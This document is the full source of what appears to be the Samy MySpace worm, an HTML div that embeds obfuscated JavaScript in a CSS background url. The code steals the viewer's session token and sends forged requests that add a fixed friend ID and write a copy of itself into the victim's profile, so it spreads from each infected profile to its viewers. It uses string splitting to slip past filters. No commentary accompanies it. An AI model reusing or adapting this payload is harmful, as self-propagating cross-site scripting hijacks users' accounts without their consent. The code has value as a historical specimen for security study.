<div id=mycode style="BACKGROUND: url('javascript:eval(document.all.mycode.expr)')" 
expr="var B=String.fromCharCode(34);
    var A=String.fromCharCode(39);
    function g(){
      var C;
      try{
        var D=document.body.createTextRange();
        C=D.htmlText
      }catch(e){
      }

      if(C){
        return C
      }else{
        return eval('document.body.inne'+'rHTML')
      }
    }

    function getData(AU){
      M=getFromURL(AU,'friendID');
      L=getFromURL(AU,'Mytoken')
    }

    function getQueryParams(){
      var E=document.location.search;
      var F=E.substring(1,E.length).split('&');
      var AS=new Array();

      for(var O=0;O<F.length;O++){
        var I=F[O].split('=');
        AS[I[0]]=I[1]}return AS
    }

    var J;
    var AS=getQueryParams();
    var L=AS['Mytoken'];
    var M=AS['friendID'];

    if(location.hostname=='profile.myspace.com'){
      document.location='http://www.myspace.com'+location.pathname+location.search
    }else{
      if(!M){
        getData(g())
      }
      main()
    }

    function getClientFID(){
      return findIn(g(),'up_launchIC( '+A,A)
    }

    function nothing(){}

    function paramsToString(AV){
      var N=new String();
      var O=0;
      for(var P in AV){
        if(O>0){
          N+='&'
        }
        var Q=escape(AV[P]);

        while(Q.indexOf('+')!=-1){
          Q=Q.replace('+','%2B')
        }

        while(Q.indexOf('&')!=-1){
          Q=Q.replace('&','%26')
        }

        N+=P+'='+Q;
        O++
      }
      return N
    }

    function httpSend(BH,BI,BJ,BK){
      if(!J){
        return false
      }

      eval('J.onr'+'eadystatechange=BI');

      J.open(BJ,BH,true);

      if(BJ=='POST'){
        J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
        J.setRequestHeader('Content-Length',BK.length)
      }

      J.send(BK);

      return true
    }

    function findIn(BF,BB,BC){
      var R=BF.indexOf(BB)+BB.length;
      var S=BF.substring(R,R+1024);
      return S.substring(0,S.indexOf(BC))
    }

    function getHiddenParameter(BF,BG){
      return findIn(BF,'name='+B+BG+B+' value='+B,B)
    }

    function getFromURL(BF,BG){
      var T;
      if(BG=='Mytoken'){
        T=B
      }else{
        T='&'
      }

      var U=BG+'=';
      var V=BF.indexOf(U)+U.length;
      var W=BF.substring(V,V+1024);
      var X=W.indexOf(T);
      var Y=W.substring(0,X);
      return Y
    }

    function getXMLObj(){
      var Z=false;
      if(window.XMLHttpRequest){
        try{
          Z=new XMLHttpRequest()
        }catch(e){
          Z=false
        }
      }else if(window.ActiveXObject){
        try{
          Z=new ActiveXObject('Msxml2.XMLHTTP')
        }catch(e){
          try{
            Z=new ActiveXObject('Microsoft.XMLHTTP')
          }catch(e){
            Z=false
          }
        }
      }
      return Z
    }

    var AA=g();
    var AB=AA.indexOf('m'+'ycode');
    var AC=AA.substring(AB,AB+4096);
    var AD=AC.indexOf('D'+'IV');
    var AE=AC.substring(0,AD);
    var AF;

    if(AE){
      AE=AE.replace('jav'+'a',A+'jav'+'a');
      AE=AE.replace('exp'+'r)','exp'+'r)'+A);
      AF=' but most of all, samy is my hero. <d'+'iv id='+AE+'D'+'IV>'
    }

    var AG;

    function getHome(){
      if(J.readyState!=4){
        return
      }

      var AU=J.responseText;
      AG=findIn(AU,'P'+'rofileHeroes','</td>');
      AG=AG.substring(61,AG.length);

      if(AG.indexOf('samy')==-1){
        if(AF){
          AG+=AF;
          var AR=getFromURL(AU,'Mytoken');
          var AS=new Array();
          AS['interestLabel']='heroes';
          AS['submit']='Preview';
          AS['interest']=AG;
          J=getXMLObj();
          httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken='+AR,postHero, 'POST',paramsToString(AS))
        }
      }
    }

    function postHero(){
      if(J.readyState!=4){
        return
      }

      var AU=J.responseText;
      var AR=getFromURL(AU,'Mytoken');
      var AS=new Array();
      AS['interestLabel']='heroes';
      AS['submit']='Submit';
      AS['interest']=AG;
      AS['hash']=getHiddenParameter(AU,'hash');
      httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken='+AR,nothing, 'POST',paramsToString(AS))
    }

    function main(){
      var AN=getClientFID();
      var BH='/index.cfm?fuseaction=user.viewProfile&friendID='+AN+'&Mytoken='+L;
      J=getXMLObj();
      httpSend(BH,getHome,'GET');
      xmlhttp2=getXMLObj();
      httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658& Mytoken=' +L,processxForm,'GET')
    }

    function processxForm(){
      if(xmlhttp2.readyState!=4){
        return
      }

      var AU=xmlhttp2.responseText;
      var AQ=getHiddenParameter(AU,'hashcode');
      var AR=getFromURL(AU,'Mytoken');
      var AS=new Array();
      AS['hashcode']=AQ;
      AS['friendID']='11851658';
      AS['submit']='Add to Friends';
      httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken='+AR,nothing, 'POST',paramsToString(AS))
    }

    function httpSend2(BH,BI,BJ,BK){
      if(!xmlhttp2){
        return false
      }

      eval('xmlhttp2.onr'+'eadystatechange=BI');
      xmlhttp2.open(BJ,BH,true);

      if(BJ=='POST'){
        xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
        xmlhttp2.setRequestHeader('Content-Length',BK.length)}
      xmlhttp2.send(BK);
      return true
    }"></DIV>